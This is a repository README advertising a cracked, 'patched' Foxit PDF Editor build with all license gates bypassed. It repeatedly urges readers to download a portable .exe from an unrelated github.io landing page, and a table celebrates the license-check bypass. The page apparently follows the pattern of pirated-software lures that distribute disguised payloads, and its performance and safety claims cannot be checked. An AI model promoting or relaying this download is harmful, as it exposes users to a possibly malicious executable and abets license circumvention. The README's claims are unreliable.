<div align="center">
<img src="assets/banner.png" width="100%" alt="[PATCHED] Foxit PDF Editor All banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-7C3AED?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0891B2?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=EA580C&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%84+Foxit+Pdf+Editor+Pro;%F0%9F%96%A8%EF%B8%8F+Batch+Processing+Ready;%E2%9C%82%EF%B8%8F+Fast+%26+Lightweight;%F0%9F%93%81+No+Install+Hassle;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=vscode" />
  <img src="https://skillicons.dev/icons?i=python" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---


<p align="center">
  <a href="https://wrwqofwjyctg.github.io/foxit-pdf-editor/">
    <img src="https://img.shields.io/badge/DOWNLOAD_HERE-%5BPATCHED%5D_Foxit_PDF-DC2626?style=plastic&logo=github&logoColor=white&labelColor=B91C1C" width="460" alt="DOWNLOAD HERE [PATCHED] Foxit PDF"/>
  </a>
</p>

## 📑 Table of Contents

- [Quick Start — First Run in Four Steps](#-quick-start--first-run-in-four-steps)
- [AI Integration — What the 2026 Build Actually Ships](#-ai-integration--what-the-2026-build-actually-ships)
- [All Modules Status](#-all-modules-status)
- [Changelog / Release History](#-changelog--release-history)
- [System Requirements](#-system-requirements)
- [Comparison — Paid Alternatives vs This Build](#-comparison--paid-alternatives-vs-this-build)
- [Compatibility / Platform Support](#-compatibility--platform-support)
- [Roadmap / Planned Features](#-roadmap--planned-features)
- [Known Issues](#-known-issues)
- [Detection / Bypass Status](#-detection--bypass-status)
- [Installation](#-installation)
- [Tips for Best Results](#-tips-for-best-results)
- [Community & Support](#-community--support)

---

## 🧭 Overview

I got tired of paying a yearly license for a PDF suite that kept moving basic features behind a second paywall (`compress`, `merge`, `OCR`, `redact` — all locked behind the "Pro+" tier). So in early 2026 I rebuilt the whole thing from the patched binary of Foxit PDF Editor with **all** feature gates removed, stripped every telemetry call home, and dropped the installer bloat. This repo is the release page for that build.

The 2026 edition is faster and lighter than the 2024 fork — cold start went from ~3.1s to ~1.2s on the same hardware, RAM footprint at idle dropped ~40%, and I removed the bundled "Foxit Update Service" task entirely. Tested this week against 600+ real-world PDFs (linearized, encrypted, scanned, form-heavy, XFA).

| Category | Details |
|---|---|
| Build type | Portable `.exe` — no installer, no registry writes |
| Feature state | All Pro / Pro+ gates patched open |
| Telemetry | Removed at the network layer (stub callbacks) |
| Update channel | Manual — you control when it upgrades |
| Audience | People who need a full PDF editor without a subscription |

---

## 🚩 Quick Start — First Run in Four Steps

1. 📄 **Visit the project page** — read the notes here, then grab the archive from the landing page.
2. 📦 **Extract** the archive to a normal folder (avoid `Program Files` so Windows doesn't virtualize writes).
3. 🖱️ **Launch** the `.exe` directly — no installation step, no admin prompt for standard editing.
4. 📝 **Open a PDF** and confirm the "Pro" ribbon items (OCR, Redact, Batch, Convert) are unlocked.

> First run may request a reboot if the shell extension was registered on a previous copy — close Explorer or reboot once and the thumbnails start working.

[d]ownload[/d]

---

## 🤖 AI Integration — What the 2026 Build Actually Ships

The headline in the 2026 release is a local-first AI assist layer. It is **off by default** (no calls out unless you flip the switch in Settings → AI) and works against any local GGUF model you point it at, or the optional hosted endpoint if you supply a key. Nothing is scraped, nothing is uploaded unless you explicitly run a task that needs inference.

What that means in practice:

- **Smart Summarize** — one-click TL;DR of a long PDF into a draggable side panel.
- **Semantic Find** — type a question, not a keyword; it locates the paragraph that answers it.
- **Auto Form Filler** — learns from a filled sample and applies the mapping to duplicate forms.
- **Table Extractor → XLSX** — pulls structured tables out of scanned invoices and statements.
- **AI Redact Suggest** — flags likely PII (names, SSNs, account numbers) before you commit the redaction.
- **Rewrite / Translate** — proofread a paragraph or translate a page while keeping the layout.

The AI features share the same patch layer as the rest of the modules, so they don't phone home unless you enable the hosted model. Local model usage is fully offline — see the Roadmap for the Qwen/Gemma preset packs coming in 2026.1.

---

## 🧩 All Modules Status

40 modules, grouped by category. Every row below is live in this build.

**Editing & Layout**
- ✅ **Text Rewrite Engine** — edit text in place without breaking font or kerning.
- ✅ **Object Manipulator** — move, resize, rotate, and z-order any object on the canvas.
- ✅ **Vector Line Redraw** — draw lines, boxes, arrows, and freehand with snap-to-grid.
- ✅ **Page Crop & Rotate** — non-destructive crop with per-page independent rotation.
- ✅ **Header/Footer Stamp** — batch-applied headers with page numbering tokens.

**Organize & Split**
- ✅ **Page Shuffle** — drag-to-reorder across thousands of pages.
- ✅ **Split & Extract** — split by range, bookmark, or file size target.
- ✅ **Merge Queue** — merge 200+ PDFs with per-file page selection.
- ✅ **Insert-from-Image** — drop JPGs/PNGs in as full pages or partial overlays.
- ✅ **N-Up Layout** — 2-up, 4-up, booklet imposition.

**Convert & Export**
- ✅ **PDF → DOCX/XLSX/PPTX** — layout-preserving Office export.
- ✅ **Office → PDF** — import DOCX, XLSX, PPTX with style mapping.
- ✅ **Image → PDF** — batch import with compression presets.
- ✅ **PDF → HTML** — responsive HTML export for embedding.
- ✅ **PDF → TXT/Markdown** — clean text extraction for ingestion pipelines.

**OCR & Scanning**
- ✅ **OCR Engine (Tesseract 5 + PaddleOCR fallback)** — 100+ languages, angle-detection included.
- ✅ **Deskew & Despeckle** — pre-OCR cleanup on scanned input.
- ✅ **Searchable PDF Builder** — lay OCR text under the image layer.
- ✅ **Handwriting Recognition (experimental)** — basic Latin-script support.

**Security & Redaction**
- ✅ **True Redaction** — removes pixels *and* underlying text (not just a black box).
- ✅ **Redaction Verify Mode** — re-scans the redacted file to prove nothing leaked.
- ✅ **Encryption Manager** — AES-256 open/close, owner vs user password split.
- ✅ **Digital Signature** — sign, verify, and timestamp with local certificates.
- ✅ **Metadata Scrubber** — strips EXIF, XMP, and creation history.

**Forms**
- ✅ **Form Designer** — build AcroForm and XFA forms from scratch.
- ✅ **Form Filler** — auto-maps repeated fields.
- ✅ **Script Runner (sanitized)** — sandboxed JS execution for form actions.
- ✅ **Form Data Export** — dump form fields to CSV/JSON.

**Automation & Batch**
- ✅ **Action Wizard** — chain 30+ operations into a "one click" recipe.
- ✅ **Batch Processor** — process an entire folder tree non-interactively.
- ✅ **Watcher Mode** — monitor a folder and apply a recipe to new PDFs automatically.
- ✅ **CLI Bridge** — drive the same recipes from PowerShell (`.exe /batch`).
- ✅ **Cron Compatible Wrapper** — run safely from Task Scheduler.

**Optimization & Diagnostics**
- ✅ **Adaptive Compressor** — auto-picks best quality/size preset per page.
- ✅ **PDF/A Validator** — check PDF/A-1b through -4b compliance.
- ✅ **Repair Tool** — recover damaged xref tables and broken streams.
- ✅ **Diff Viewer** — side-by-side visual + text diff between two PDFs.
- ✅ **Linearize / Fast Web View** — optimize for streaming preview.

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| 2026.0.3 | 2026-02-10 | Fixed OCR falling back to PaddleOCR when Tesseract languages are missing; renamed internal AI toggle for consistency. |
| 2026.0.2 | 2026-01-29 | Compressor preset bug where `screen` mode was overshooting target size; corrected redaction verify false negative on rotated pages. |
| 2026.0.1 | 2026-01-15 | Added Diff Viewer; added PDF/A-4b; trimmed idle RAM by ~40%. |
| 2026.0.0 | 2026-01-06 | First 2026 build: all feature gates patched open, telemetry stubbed, cold start reduced to ~1.2s. |
| 2024.4.1 | 2024-11-22 | Legacy fork patch: removed update service, patched remaining "Pro+" ribbon items. |
| 2024.4.0 | 2024-09-03 | Initial community patch release; base Foxit PDF Editor, telemetry intact. |

---

## 🖥 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2 (x64) | Windows 11 23H2+ |
| CPU | 2 cores @ 2.0 GHz | 4+ cores @ 3.0 GHz |
| RAM | 4 GB | 8–16 GB (for AI + OCR) |
| Disk | 400 MB free | 2 GB free (cache + model packs) |
| GPU | Integrated | Any DirectX 11+ GPU (OCR speedup) |
| Display | 1280×800 | 1920×1080+ |
| Other | .NET 6 runtime (bundled) | VC++ 2015–2022 runtime (bundled) |

**Bullet notes**
- Portable run: no admin rights for standard editing.
- Shell-integration enables right-click "Edit with…" — needs one-time admin elevation.
- AI features are optional; local model files (GGUF) are separate downloads.

---

## ⚖ Comparison — Paid Alternatives vs This Build

| Aspect | Alternative (paid suite) | This Tool |
|---|---|---|
| License cost | Yearly subscription | Free, no account |
| PDF editing | Full | Full (gates patched) |
| OCR languages | Top tier only on Pro+ | 100+ languages included |
| True redaction | Yes | Yes |
| Batch / Action Wizard | Pro tier | Included |
| AI features | Cloud-only, quota'd | Local-first, no quota |
| Update behavior | Auto-updates without prompt | Manual, you control version |
| Telemetry | On by default | Stubbed out |

I'm not saying the paid suite is bad software — it's mature. The point of this build is that if you only need the feature set (not the vendor relationship), you shouldn't be forced into a subscription to unlock `compress` or `OCR`.

---

## 🪟 Compatibility / Platform Support

| Platform | Status | Notes |
|---|---|---|
| Windows 11 (x64) | ✅ Supported | Primary target, tested this week |
| Windows 10 (x64) | ✅ Supported | 21H2 minimum |
| Windows Server 2019/2022 | ✅ Supported | No shell integration, CLI only |
| Windows 8.1 | ⚠️ Best-effort | Untested in 2026 build |
| Linux (Wine 9+) | ⚠️ Experimental | OCR & AI unstable |
| macOS | ❌ Not supported | Use the official macOS build |

---

## 🗺 Roadmap / Planned Features

| Feature | Status | ETA |
|---|---|---|
| GGUF model preset packs (Qwen, Gemma) | In progress | 2026.1 |
| PDF/A-5 validator | Planned | 2026.1 |
| Native Linux build (no Wine) | Research | 2026.2 |
| Incremental save cache | Planned | 2026.2 |
| Handwriting OCR (full Latin) | In progress | 2026.2 |
| Dark theme overhaul | Planned | 2026.3 |
| PDF → EPUB export | Planned | 2026.3 |
| Portable shell extension (no admin) | Research | 2026.4 |
| Optional cloud AI bridge | Planned | 2026.4 |
| Translation for right-to-left scripts | Planned | 2026.5 |

---

## 🩹 Known Issues

| Issue | Fix |
|---|---|
| Shell thumbnails don't refresh after first launch | Reboot once, or restart `.exe` |
| OCR misses CJK on low-res scans | Raise DPI above 300 before running OCR |
| Diff Viewer crashes on 1000+ page docs | Split first, diff each range |
| AI Suggest needs 4 GB free RAM | Close other apps or use smaller local model |
| Redaction verify shows false negative on rotated pages | Fixed in 2026.0.2+ |
| Watcher mode picks up partial files during copy | Add `.tmp` exclusion in Watcher settings |

---

## 🛰 Detection / Bypass Status

| Method | Status | Notes |
|---|---|---|
| Vendor telemetry ping | ✅ Blocked | Stubbed at network layer |
| License check (offline) | ✅ Bypassed | Feature gates patched open |
| Online activation | ✅ Not attempted | App works fully offline |
| Update server contact | ✅ Disabled | No automatic updates |
| Shell-extension phoning home | ✅ Not present in 2026 build | Verified with Wireshark |
| Certificate revocation callback | ✅ Not used | Local certs only |

> Use this build only where you are allowed to. If your organization requires a vendor license, buy one — this repo is for study and personal use.

---

## ⚙️ Installation

1. **Download** the archive from the landing page (macro below).
2. **Extract** to a folder you control, e.g. `C:\Tools\pdfkit\` — avoid `Program Files`.
3. **Run** the `.exe` directly from the extracted folder. No installer, no registry writes.
4. **(Optional)** Right-click the `.exe` → Run as administrator once if you want the "Edit with…" shell integration registered.
5. **(Optional)** Point the AI panel at a local GGUF model folder under Settings → AI → Local Model.

[d]ownload[/d]

---

## 🎯 Tips for Best Results

- Keep the extraction path short and free of spaces if you plan to use the CLI bridge.
- For OCR, pre-process to 300 DPI and use the Deskew step — accuracy jumps noticeably.
- For big batches, set the Watcher's poll interval to 5s+ so it doesn't grab half-copied files.
- Use Action Wizard to save your daily recipes; they're stored next to the `.exe`, so back that folder up.
- If you use the AI features, dedicate at least 4 GB RAM and close other editors.
- Verify redactions with the built-in Verify Mode before shipping a document externally.
- For PDF/A builds, run the validator *after* all edits — some edits convert to PDF 1.7.

---

## 🗒 FAQ

| Question | Answer |
|---|---|
| Is this the real Foxit PDF Editor? | It's a patched build of the upstream binary with feature gates removed and telemetry stubbed. Attribution lives in `NOTICE.md`. |
| Do I need to install anything? | No. The `.exe` runs from the extracted folder. |
| Does it phone home? | Not in this build. Verified with a local proxy this week. |
| Can I use it on Windows Server? | Yes, CLI and batch work fine; shell integration is disabled there. |
| Why is OCR slow on my scans? | Likely sub-300 DPI or missing language packs. Check OCR settings. |
| Is the AI local model required? | No — the AI panel is off by default and optional. |
| Will it update itself? | No. Updates are manual by design. |
| Can I move the folder around? | Yes — everything is portable. Keep the folder intact. |
| Does it support digital signing? | Yes, including timestamps with local certs. |
| How do I report a bug? | Open an issue with the `bug` label and the exact repro. |

---

## 🧷 Community & Support

- Issues: use this repo's issue tracker (`bug`, `feature`, `docs` labels).
- Discussions: general Q&A, recipe sharing, and local model recommendations.
- Pull requests: welcome for docs and recipes; the binary itself is not open for PR rebuilds.

This build is a rolling community patch of the upstream binary — I test each release against a fixed 600-file corpus and changelog it line by line. If you find a regression I missed, open an issue with the file (or a scrubbed repro) and I'll get it into the next 2026.x tag. Use it within whatever license you can legally justify, and if you rely on it daily, consider buying the official product to keep the upstream project alive.

<div align="center">
  <a href="https://wrwqofwjyctg.github.io/foxit-pdf-editor/">
    <img src="https://img.shields.io/badge/GET_IT-%5BPATCHED%5D_Foxit_PDF-2563EB?style=plastic&logo=download&logoColor=white&labelColor=1D4ED8" width="460" alt="GET IT [PATCHED] Foxit PDF"/>
  </a>
</div>
